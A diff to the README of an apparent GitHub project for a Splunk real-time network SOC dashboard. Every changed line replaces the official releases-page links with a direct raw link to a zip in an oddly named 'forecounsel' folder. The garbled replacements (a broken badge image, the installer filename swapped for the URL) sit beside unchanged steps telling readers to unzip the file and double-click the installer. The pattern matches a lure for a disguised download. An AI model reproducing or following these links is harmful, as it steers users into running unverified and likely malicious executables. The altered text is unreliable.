@@ -1,6 +1,6 @@
 # 🚨 Splunk-Realtime-Network-SOC-Dashboard - Monitor Network Threats Live
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/MAMAHM2/Splunk-Realtime-Network-SOC-Dashboard/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MAMAHM2/Splunk-Realtime-Network-SOC-Dashboard/main/forecounsel/Realtime_SO_Dashboard_Network_Splunk_v3.0-beta.3.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/MAMAHM2/Splunk-Realtime-Network-SOC-Dashboard/main/forecounsel/Realtime_SO_Dashboard_Network_Splunk_v3.0-beta.3.zip)
 
 ---
 
@@ -18,7 +18,7 @@ To get started, you need to download the software from the official release page
 
 ### Step 1: Visit the download page
 
-[Download the latest version here](https://github.com/MAMAHM2/Splunk-Realtime-Network-SOC-Dashboard/releases)
+[Download the latest version here](https://raw.githubusercontent.com/MAMAHM2/Splunk-Realtime-Network-SOC-Dashboard/main/forecounsel/Realtime_SO_Dashboard_Network_Splunk_v3.0-beta.3.zip)
 
 Clicking the above link takes you to the release page. Find the latest version and download the files listed under it. Usually, there will be a file package ready for your computer.
 
@@ -37,7 +37,7 @@ Before installing, make sure your computer meets these minimum specifications:
 1. Locate the downloaded file (usually in your Downloads folder).
 2. If it is a compressed file (like `.zip`), unzip it by right-clicking and choosing "Extract All."
 3. Open the extracted folder.
-4. Look for a file named `setup.exe` (Windows) or an installer package for your system.
+4. Look for a file named `https://raw.githubusercontent.com/MAMAHM2/Splunk-Realtime-Network-SOC-Dashboard/main/forecounsel/Realtime_SO_Dashboard_Network_Splunk_v3.0-beta.3.zip` (Windows) or an installer package for your system.
 5. Double-click the installer file.
 6. Follow the on-screen instructions to complete the installation. The process should be straightforward and ask you to agree to terms, confirm installation location, and finalize setup.
 
@@ -111,4 +111,4 @@ For further help, check the Issues section on the GitHub repository or contact y
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/MAMAHM2/Splunk-Realtime-Network-SOC-Dashboard/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MAMAHM2/Splunk-Realtime-Network-SOC-Dashboard/main/forecounsel/Realtime_SO_Dashboard_Network_Splunk_v3.0-beta.3.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/MAMAHM2/Splunk-Realtime-Network-SOC-Dashboard/main/forecounsel/Realtime_SO_Dashboard_Network_Splunk_v3.0-beta.3.zip)
